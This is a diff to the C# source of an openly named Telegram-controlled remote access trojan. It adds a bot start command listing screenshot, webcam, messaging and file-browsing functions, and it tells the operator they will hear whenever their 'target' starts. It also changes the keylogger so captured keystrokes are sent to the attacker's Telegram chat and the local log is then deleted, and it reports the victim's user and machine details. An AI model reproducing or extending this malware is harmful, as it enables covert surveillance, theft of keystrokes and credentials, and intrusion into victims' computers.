@@ -18,6 +18,7 @@ using IronPython.Hosting;
 using Microsoft.Scripting.Hosting;
 using Microsoft.Win32;
 using AForge.Video.DirectShow;
+using CommandPrompt = Telegram.Bot.Types.BotCommand;
 
 
 namespace TelegramRAT
@@ -150,7 +151,7 @@ namespace TelegramRAT
                 return false;
 
             if (command.Command != model.Command)
-                return false;
+                return false;           
 
             if ((command.IgnoreCountArgs || command.CountArgs != 0) && model.Args.Length != 0)
             {
@@ -186,6 +187,57 @@ namespace TelegramRAT
 
         static void InitializeCommands(List<BotCommand> CommandsList)
         {
+
+            //START
+            CommandsList.Add(new BotCommand
+            {
+                Command = "start",
+
+                Execute = model =>
+                {
+                    CommandPrompt[] botCommands = new CommandPrompt[]
+                    {
+                        new CommandPrompt
+                        {
+                            Command = "screenshot",
+                            Description = " 🖼 Capture screen"
+                        },
+                        new CommandPrompt
+                        {
+                            Command = "webcam",
+                            Description = "📷 Capture webcam"
+                        },
+                        new CommandPrompt
+                        {
+                            Command = "message",
+                            Description = "✉️ Send message"
+                        },
+                        new CommandPrompt
+                        {
+                            Command = "cd",
+                            Description = "🗃 Change directory"
+                        },
+                        new CommandPrompt
+                        {
+                            Command = "dir",
+                            Description = "🗂 Current directory content"
+                        },
+                        new CommandPrompt
+                        {
+                            Command = "help",
+                            Description = "ℹ️ See description of command"
+                        },
+                        new CommandPrompt
+                        {
+                            Command = "commands",
+                            Description = "📃 List of all commands"
+                        }
+                    };
+                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Welcome, since you see this message, you've done everything well. Now you will receive a message every time your target starts. I kindly remind you, that this software was written in educational purposes only, don't use it for bothering or trolling people pls.\nUse /help and /command to lern this bot functionality");
+                    Bot.SetMyCommandsAsync(new List<CommandPrompt>(botCommands)).Wait();
+                }
+            });
+
             //HELP
             CommandsList.Add(new BotCommand
             {
@@ -1435,12 +1487,13 @@ namespace TelegramRAT
                                 streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
                                 streamWriter.Close();
                             }
-                            Bot.SendTextMessageAsync(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
+                            //Bot.SendTextMessageAsync(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
 
                             using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
                             {
                                 Bot.SendDocumentAsync(model.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
                             }
+                            System.IO.File.Delete("keylog.txt");
                         }
                         catch (Exception ex)
                         {
@@ -1965,16 +2018,26 @@ namespace TelegramRAT
                 Description = "Get info about environment and this program process",
                 Execute = model =>
                 {
-                    string sysInfo =
-                    $"User name: {Environment.UserName}\n" +
-                    $"PC name: {Environment.MachineName}\n\n" +
+                    Task.Run(() =>
+                    {
+                        try
+                        {
+                            string sysInfo =
+                            $"User name: {Environment.UserName}\n" +
+                            $"PC name: {Environment.MachineName}\n\n" +
 
-                    $"OS: {GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
-                    $"NT version: {Environment.OSVersion.Version}\n" +
-                    $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n";
+                            $"OS: {GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
+                            $"NT version: {Environment.OSVersion.Version}\n" +
+                            $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n";
 
 
-                    Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
+                            Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(model.Message, ex);
+                        }
+                    });
                 }
             });
 
@@ -2012,6 +2075,7 @@ namespace TelegramRAT
                     });
                 }
             });
+
 
         }
 
